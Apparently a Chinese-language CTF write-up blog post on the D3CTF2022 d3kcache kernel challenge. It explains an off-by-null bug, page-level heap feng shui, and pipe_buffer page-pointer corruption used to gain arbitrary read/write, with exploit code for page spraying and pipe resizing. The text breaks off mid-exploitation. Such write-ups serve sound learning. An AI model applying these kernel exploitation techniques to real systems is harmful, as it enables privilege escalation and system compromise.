<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="orz">
<meta property="og:type" content="article">
<meta property="og:title" content="从d3cache看页级堆风水与一个off-by-null导致的任意读写">
<meta property="og:url" content="https://ixout.github.io/posts/10326/index.html">
<meta property="og:site_name" content="ixout&#39;s blog">
<meta property="og:description" content="orz">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/clipboard.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/clipboard%202.png">
<meta property="article:published_time" content="2024-03-24T13:37:46.000Z">
<meta property="article:modified_time" content="2025-01-07T13:22:54.504Z">
<meta property="article:author" content="ixout">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/clipboard.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.png">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
        
      
    
    <!-- title -->
    <title>从d3cache看页级堆风水与一个off-by-null导致的任意读写</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/posts/29003/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/posts/57127/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/10326/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/10326/&text=从d3cache看页级堆风水与一个off-by-null导致的任意读写"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/10326/&title=从d3cache看页级堆风水与一个off-by-null导致的任意读写"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/10326/&is_video=false&description=从d3cache看页级堆风水与一个off-by-null导致的任意读写"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=从d3cache看页级堆风水与一个off-by-null导致的任意读写&body=Check out this article: https://ixout.github.io/posts/10326/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/10326/&title=从d3cache看页级堆风水与一个off-by-null导致的任意读写"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/10326/&title=从d3cache看页级堆风水与一个off-by-null导致的任意读写"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/10326/&title=从d3cache看页级堆风水与一个off-by-null导致的任意读写"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/10326/&title=从d3cache看页级堆风水与一个off-by-null导致的任意读写"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/10326/&name=从d3cache看页级堆风水与一个off-by-null导致的任意读写&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/10326/&t=从d3cache看页级堆风水与一个off-by-null导致的任意读写"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#D3CTF2022-d3kcache"><span class="toc-number">1.</span> <span class="toc-text">D3CTF2022-d3kcache</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.</span> <span class="toc-text">保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">模块分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.4.</span> <span class="toc-text">思路实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4%E6%9E%84%E9%80%A0"><span class="toc-number">1.4.1.</span> <span class="toc-text">页级堆风水构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1uaf"><span class="toc-number">1.4.2.</span> <span class="toc-text">第一次uaf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1uaf"><span class="toc-number">1.4.3.</span> <span class="toc-text">第二次uaf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E8%87%AA%E5%86%99%E7%AE%A1%E9%81%93"><span class="toc-number">1.4.4.</span> <span class="toc-text">构建自写管道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99"><span class="toc-number">1.4.5.</span> <span class="toc-text">任意读写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF"><span class="toc-number">1.4.6.</span> <span class="toc-text">泄露信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.5.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9cred"><span class="toc-number">1.5.1.</span> <span class="toc-text">修改cred</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E5%86%99%E5%86%85%E6%A0%B8%E6%A0%88"><span class="toc-number">1.5.2.</span> <span class="toc-text">覆写内核栈</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%BF%BB%E8%AF%91"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">虚拟地址翻译</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#USMA"><span class="toc-number">1.5.3.</span> <span class="toc-text">USMA</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        从d3cache看页级堆风水与一个off-by-null导致的任意读写
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">ixout</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-03-24T13:37:46.000Z" class="dt-published" itemprop="datePublished">2024-03-24</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="D3CTF2022-d3kcache"><a href="#D3CTF2022-d3kcache" class="headerlink" title="D3CTF2022-d3kcache"></a>D3CTF2022-d3kcache</h1><p>这题原本是记录在kernel习题记录的,但是深入理解arttnba3师傅的博客后,发现这题蕴含的知识太丰富了</p>
<p>于是打算单独开一篇文章,好好赏析一番</p>
<p>另外,arttnba3师傅tql!!!orz</p>
<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><p>常规保护kaslr,kpti,smap,smep等等都是拉满的</p>
<p>除此之外在config中还可以看到开启了<code>CONFIG_CFI_CLANG</code>保护</p>
<p>google可以得知一下信息</p>
<blockquote>
<p>This option enables Clang’s forward-edge Control Flow Integrity (CFI) checking, where the compiler injects a runtime check to each indirect function call to ensure the target is a valid function with the correct static type. This restricts possible call targets and makes it more difficult for an attacker to exploit bugs that allow the modification of stored function pointers. More information can be found from Clang’s documentation:</p>
<p><a target="_blank" rel="noopener" href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">https://clang.llvm.org/docs/ControlFlowIntegrity.html</a></p>
</blockquote>
<p>即选中了该选项的内核编译时,会在间接函数跳转处加入更多的检查,确保间接函数指针不被劫持</p>
<p>说简单点就是在发生call调用后,会在跳转目标头部做一些检查</p>
<p>这样一来,函数指针表将会受到严格保护,像修改函数指针虚表这样的流劫持,就很难利用了,因为不能劫持函数指针为gadget!!</p>
<h2 id="模块分析"><a href="#模块分析" class="headerlink" title="模块分析"></a>模块分析</h2><p>模块创建了一个obj为2048大小的slab分配器</p>
<p>并通过ioctl实现了常规的note增加,删除,追加和展示等功能</p>
<p>唯一关键的点在于追加过程中会导致一个<code>off-by-null</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">1300</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( idx &lt;= <span class="number">0xF</span>uLL &amp;&amp; kcache_list[idx].ptr )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = input_size;</span><br><span class="line">          <span class="keyword">if</span> ( input_size &gt; <span class="number">0x800</span> || input_size + kcache_list[idx].size &gt;= <span class="number">0x800</span> )</span><br><span class="line">            v7 = <span class="number">2048</span> - kcache_list[idx].size;</span><br><span class="line">          <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">            BUG();</span><br><span class="line">          v8 = (<span class="type">char</span> *)kcache_list[idx].ptr + (<span class="type">unsigned</span> <span class="type">int</span>)kcache_list[idx].size;<span class="comment">// append</span></span><br><span class="line">          v9 = (<span class="type">unsigned</span> <span class="type">int</span>)v7;</span><br><span class="line">          v10 = input_ptr;</span><br><span class="line">          _check_object_size(v8, (<span class="type">unsigned</span> <span class="type">int</span>)v7, <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !copy_from_user(v8, v10, v9) )</span><br><span class="line">          &#123;</span><br><span class="line">            v8[v9] = <span class="number">0</span>;<span class="comment">//off-by-null</span></span><br><span class="line">            v5 = <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">        &#125;</span><br><span class="line">        v25 = &amp;unk_837;</span><br><span class="line">LABEL_46:</span><br><span class="line">        printk(v25);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>在内核中仅有一个<code>off-by-null</code>漏洞似乎难以利用</p>
<p>不过当我们遍历那些内核pwn中常利用的结构体之后,我们可以发现<code>pipe_buffer</code>是一个十分适合的对象</p>
<p>其既可以读也可以写,而读写目标完全由其<code>page</code>成员决定,并且<code>page</code>成员就在结构体的起始处</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *	@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *	@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *	@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *	@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *	@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *	@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>我们知道<code>struct page</code>对应着唯一一个物理页,每个<code>struct page</code>的大小是0x40</p>
<p>那么如果我们的<code>off-by-null</code>漏洞刚好作用在pipe_buffer的<code>page</code>字段,岂不是就会使得两个pipe_buffer的page字段指向同一个<code>struct page</code>进而操作在同一个物理页上</p>
<p>不过考虑到page字段的最低处本身就有<code>1/4</code>的概率是<code>\x00</code>,所以只有<code>3/4</code>的概率能够成功劫持</p>
<p>我们暂且不考虑做到这一步的细节,继续向下思考</p>
<p>现在我们有了两个能够操控相同物理页的pipe,很自然的一个思路便是UAF泄露信息然后劫持结构体函数指针</p>
<p>但别忘了内核开启了CFI,也就是说这种方法并不适用,那在这种情况下要想提权就必须要具备一定程度的读写能力</p>
<p><code>arttnba3</code>大佬给出了一个十分巧妙的办法,即释放其中一个pipe,让这个uaf的页继续作为<code>pipe_buffer</code>的slab页</p>
<p>此时我们可以用另一个pipe读出uaf页内部的信息,这其中就包含着完整的page指针,如果我们再拿这个page指针去覆盖uaf页上下一个<code>pipe_buffer</code>结构体,岂不是又构造了一次uaf</p>
<p>接着我们再释放这两个pipe中的一个,并再次将该页作为<code>pipe_buffer</code>的slab页</p>
<p>与上一次uaf不同的是,这一次uaf我们是知道这个uaf页的<code>struct page*</code>指针的,那么我们岂不是可以直接修改这个uaf页上的pipe_buffer的page指针为本uaf页的page指针</p>
<p>从而使得这一次uaf页上的pipe_buffer指向自身</p>
<p>之后多修改几个这样的指针让其互相重置岂不是可以任意读写,再提权不是十分简单</p>
<h2 id="思路实现"><a href="#思路实现" class="headerlink" title="思路实现"></a>思路实现</h2><p>以上理了一遍思路,现在开始分析如何实现</p>
<h3 id="页级堆风水构造"><a href="#页级堆风水构造" class="headerlink" title="页级堆风水构造"></a>页级堆风水构造</h3><p>此前已经学习过利用setsockopt来构造堆风水</p>
<p>此处不再赘述</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~ $ <span class="built_in">cat</span> /proc/buddyinfo </span><br><span class="line">Node 0, zone      DMA      0      0      0      0      0      1      1      1      0      1     </span><br><span class="line">Node 0, zone    DMA32      1      2      1      2      4      1      2      2      6      2    </span><br></pre></td></tr></table></figure>
<p>我们可以看到,内核刚启动时伙伴系统算是比较干净的</p>
<p>低阶的连续页较少,次数不多的setsockopt便能够清空低阶的连续页</p>
<p>也就是对应exp中的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* spray pages in different size for various usages */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_pgv_pages</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * We want a more clear and continuous memory there, which require us to </span></span><br><span class="line"><span class="comment">     * make the noise less in allocating order-3 pages.</span></span><br><span class="line"><span class="comment">     * So we pre-allocate the pages for those noisy objects there.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-0 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(i, <span class="number">0x1000</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-2 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">4</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray 8 pages for page-level heap fengshui */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-3 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="comment">/* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">19</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_4pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">21</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">512</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">8</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使得之后分配的页都是高阶拆分下来的连续页,之所以后面还要隔几个释放一个,是因为socket产生的噪声,为了尽量避免其拆散高阶连续页,所以释放之前申请的给其使用</p>
<p>现在面临的一个问题是</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;li&gt;</span></span><br><span class="line">kcache_jar            16     16   2048   16    8 : tunables    0    0    0 : slabdata      1   0</span><br><span class="line">kmalloc-cg-1k         94    160   1024   16    4 : tunables    0    0    0 : slabdata     10   0</span><br><span class="line">dma-kmalloc-4k         0      0   4096    8    8 : tunables    0    0    0 : slabdata      0   0</span><br></pre></td></tr></table></figure>
<p>页级堆风水要保证成功率,最好是向同一个order申请</p>
<p><code>kcache_jar</code>所在的分配器每一次申请slab都是申请8页也就是order3</p>
<p>而<code>pipe_buffer</code>默认创建16个大小是<code>640</code>是向<code>kmalloc-cg-1k</code>申请,并在耗尽时向order2申请</p>
<p>但要想保证较高的成功率,我们需要想办法使得二者是向同阶的order申请,<code>kcache_jar</code>显然没法改</p>
<p>但<code>pipe_buffer</code>并不是改不了</p>
<p>fcntl提供了接口</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">pipe_fcntl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">    pipe = get_pipe_info(file, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pipe)</span><br><span class="line">        <span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">    __pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> F_SETPIPE_SZ:</span><br><span class="line">        ret = pipe_set_size(pipe, arg);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pipe_set_size</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    ret = pipe_resize_ring(pipe, nr_slots);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe_resize_ring</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">int</span> nr_slots)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> head, tail, mask, n;</span><br><span class="line"></span><br><span class="line">    bufs = kcalloc(nr_slots, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">               GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br></pre></td></tr></table></figure>
<p>我们可以通过这个改变pipe_buffer申请obj的slab</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">extend_pipe_buffer_to_4k</span><span class="params">(<span class="type">int</span> start_idx, <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nr; i++) &#123;</span><br><span class="line">        <span class="comment">/* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_8pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */</span></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[start_idx + i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, start_idx + i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
